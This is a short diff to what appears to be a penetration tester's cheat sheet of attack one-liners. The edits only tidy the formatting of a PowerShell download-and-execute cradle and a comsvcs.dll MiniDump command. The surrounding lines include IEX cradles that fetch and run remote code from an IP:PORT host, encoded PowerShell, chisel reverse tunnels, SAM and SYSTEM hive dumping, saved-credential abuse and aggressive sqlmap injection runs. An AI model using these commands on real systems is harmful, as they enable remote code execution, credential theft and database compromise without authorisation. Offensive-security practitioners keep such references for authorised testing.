@@ -31,7 +31,7 @@ chisel client IP:PORT R:PORT:IP:PORT
 openssl pkcs12 -in PFX_PATH -out PEM_PATH -nocerts -nodes
 openssl pkcs12 -in PFX_PATH -out CRT_PATH -nokeys -nodes
 IEX(New-Object Net.WebClient).DownloadString('http://IP:PORT/FILE')
-IEX (IWR 'http://IP:PORT/FILE' -UseBasicParsing)
+IEX(IWR 'http://IP:PORT/FILE' -UseBasicParsing)
 (New-Object Net.WebClient).DownloadFile('http://IP:PORT/FILE', 'FILE')
 echo -n COMMAND | iconv --to-code UTF-16LE | base64 -w 0
 powershell -EncodedCommand COMMAND
@@ -58,7 +58,7 @@ cmdkey /list
 runas /user:DOMAIN\USERNAME /savecred PATH
 reg save HKLM\SAM PATH
 reg save HKLM\SYSTEM PATH
-rundll32 C:\windows\System32\comsvcs.dll,:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID PATH full
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump PID PATH full
 sqlmap -r PATH --technique=BEUS --level=5 --risk=3 -v 3 --batch
 sqlmap -r PATH --privileges
 END
